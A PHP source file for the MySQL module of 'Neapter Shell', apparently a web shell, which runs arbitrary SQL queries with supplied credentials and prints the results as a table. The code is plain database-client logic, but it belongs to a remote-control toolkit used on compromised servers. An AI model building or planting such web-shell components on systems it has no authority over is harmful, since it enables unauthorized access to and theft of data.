<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Wykonywanie polecen SQL
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleMysql extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'mysql' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Połączenie z bazą MySQL

	Użycie:
		mysql host:port login@hasło nazwa_bazy komenda

	Przykład:
		mysql localhost:3306 test@test mysql "SELECT 1"
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc !== 4 )
		{
			return $this -> getHelp();
		}

		$aHost = $this -> oShell -> getHost( $this -> oShell -> aArgv[0] );

		/**
		 * Domyslny port to 3306
		 */
		if( $aHost[1] === 0 )
		{
			$aHost[1] = 3306;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> oShell -> aArgv[1], 2 );

		/**
		 * PDO jest wymagane
		 */
		if( ! extension_loaded( 'pdo' ) )
		{
			return 'Brak rozszerzenia PDO';
		}

		try
		{
			/**
			 * Polaczenie do bazy
			 */
			$oPdo = new PDO( sprintf( 'mysql:host=%s;port=%d;dbname=%s', $aHost[0], $aHost[1], $this -> oShell -> aArgv[2] ), $sUsername, $sPassword );

			$oSql = $oPdo -> query( $this -> oShell -> aArgv[3] );

			$aData = $oSql -> fetchAll( PDO::FETCH_ASSOC );

			$oSql -> closeCursor();

			if( $aData === array() )
			{
				return 'Brak wyników';
			}

			/**
			 * $aDataLength przechowuje dlugosc najdluzszego ciagu w danej kolumnie
			 */
			$aDataLength = $aData[0];

			/**
			 * Domyslnie dlugosc pola to dlugosc kolumny
			 */
			array_walk( $aDataLength, create_function( '& $sVal, $sKey', '$sVal = strlen( $sKey );' ) );

			/**
			 * Obliczanie dlugosci ciagu
			 */
			foreach( $aData as $aRow )
			{
				foreach( $aRow as $sColumn => $sValue )
				{
					if( ( $iLength = strlen( $sValue ) ) > $aDataLength[ $sColumn ] )
					{
						$aDataLength[ $sColumn ] = $iLength;
					}
				}
			}

			$sOutput = NULL;

			$sLines = str_repeat( '-', array_sum( $aDataLength ) + 1 + 3 * count( $aDataLength ) ) . "\r\n";

			$sOutput .= $sLines;
			/**
			 * Nazwy kolumn
			 */
			foreach( $aDataLength as $sColumn => $sValue )
			{
				$sOutput .= '| ' . str_pad( $sColumn, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
			}
			$sOutput .= "|\r\n" . $sLines;

			/**
			 * Dane
			 */
			foreach( $aData as $aRow )
			{
				foreach( $aRow as $sColumn => $sValue )
				{
					$sOutput .= '| ' . str_pad( $sValue, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
				}
				$sOutput .= "|\r\n";
			}

			return htmlspecialchars( $sOutput . $sLines );
		}
		/**
		 * Wyjatek
		 */
		catch( PDOException $oException )
		{
			return sprintf( 'Wystąpił błąd: %s', $oException -> getMessage() );
		}
	}

}